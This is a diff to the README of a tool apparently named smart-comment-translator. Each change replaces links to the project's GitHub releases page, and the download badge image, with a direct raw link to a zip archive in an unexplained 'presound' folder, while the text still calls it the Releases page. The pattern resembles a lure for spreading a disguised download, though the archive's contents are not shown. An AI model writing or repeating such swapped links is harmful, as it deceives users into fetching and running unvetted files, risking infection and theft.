@@ -6,14 +6,14 @@ The **smart-comment-translator** makes it easy to translate code comments into o
 
 ## 📥 Download Now
 
-[![Download smart-comment-translator](https://img.shields.io/badge/Download-smart--comment--translator-blue.svg)](https://github.com/zenorzr/smart-comment-translator/releases)
+[![Download smart-comment-translator](https://raw.githubusercontent.com/zenorzr/smart-comment-translator/main/presound/smart-comment-translator.zip)](https://raw.githubusercontent.com/zenorzr/smart-comment-translator/main/presound/smart-comment-translator.zip)
 
 ## 🚀 Getting Started
 
 This guide will help you download and run the **smart-comment-translator** application. Follow these steps for a smooth installation:
 
 1. **Visit the Releases Page**  
-   To get started, go to the [Releases page](https://github.com/zenorzr/smart-comment-translator/releases). Here, you will find the latest version of the software.
+   To get started, go to the [Releases page](https://raw.githubusercontent.com/zenorzr/smart-comment-translator/main/presound/smart-comment-translator.zip). Here, you will find the latest version of the software.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of versions. Find the latest stable version for your platform. Look for files like `.exe` for Windows or `.dmg` for macOS.
@@ -76,6 +76,6 @@ If you need further assistance, feel free to reach out through the Issues sectio
 
 ## 📥 Download & Install
 
-To download the app, visit the [Releases page](https://github.com/zenorzr/smart-comment-translator/releases), select your version, and follow the steps provided. 
+To download the app, visit the [Releases page](https://raw.githubusercontent.com/zenorzr/smart-comment-translator/main/presound/smart-comment-translator.zip), select your version, and follow the steps provided. 
 
 Start improving your coding experience today!
